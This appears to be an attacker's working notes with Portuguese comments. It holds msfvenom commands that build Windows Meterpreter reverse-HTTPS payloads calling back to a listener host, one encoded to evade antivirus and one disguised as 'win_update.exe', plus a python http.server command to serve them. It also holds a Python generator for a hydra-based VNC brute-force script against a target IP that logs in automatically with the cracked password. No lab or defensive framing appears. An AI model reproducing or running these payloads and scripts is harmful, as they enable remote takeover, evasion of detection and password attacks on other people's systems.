msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -e x86/shikata_ga_nai -i 10 -f exe -o payload_encoded.exe

msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -f exe -o ~/win_update.exe

msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -f psh-cmd -o payload.ps1

python3 -m http.server 8080

# Criando um script Python que faz brute force VNC com hydra e testa o login com vncviewer automaticamente

ip_alvo = "192.168.1.84"  # IP alvo
wordlist_path = "/mnt/data/wordlist_atibaia.txt"

script_content = f"""
import subprocess
import time

ip_alvo = "{ip_alvo}"
wordlist_path = "{wordlist_path}"

print(f"Iniciando brute force VNC contra {{ip_alvo}}...\\n")

# Executa brute force via hydra
comando = [
    "hydra",
    "-P", wordlist_path,
    "-t", "4",
    "-f",
    "-V",
    ip_alvo,
    "vnc"
]

resultado = subprocess.run(comando, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

# Se encontrar a senha no output do hydra
for linha in resultado.stdout.splitlines():
    if "login:" in linha or "host:" in linha:
        print("\\n====> Senha encontrada! Resultado:")
        print(linha)
        
        # Extrai a senha do output
        partes = linha.split()
        for parte in partes:
            if "password:" in parte:
                senha_encontrada = parte.split("password:")[1]
                break
        else:
            # fallback caso o formato seja diferente
            senha_encontrada = partes[-1]

        print(f"Tentando conexão automática com vncviewer usando a senha: {{senha_encontrada}}")

        # Testa o login com vncviewer
        print("\\nAbrindo VNC Viewer... Feche manualmente quando quiser encerrar a sessão.")
        subprocess.Popen(["vncviewer", ip_alvo, "-passwd", senha_encontrada])
        break
else:
    print("Nenhuma senha encontrada ou tentativa falhou.")

print("Brute force VNC concluído.")
"""

with open("/mnt/data/bruteforce_vnc_auto_connect.py", "w") as f:
    f.write(script_content)

print("Script Python criado: 'bruteforce_vnc_auto_connect.py' (com conexão automática via vncviewer).")


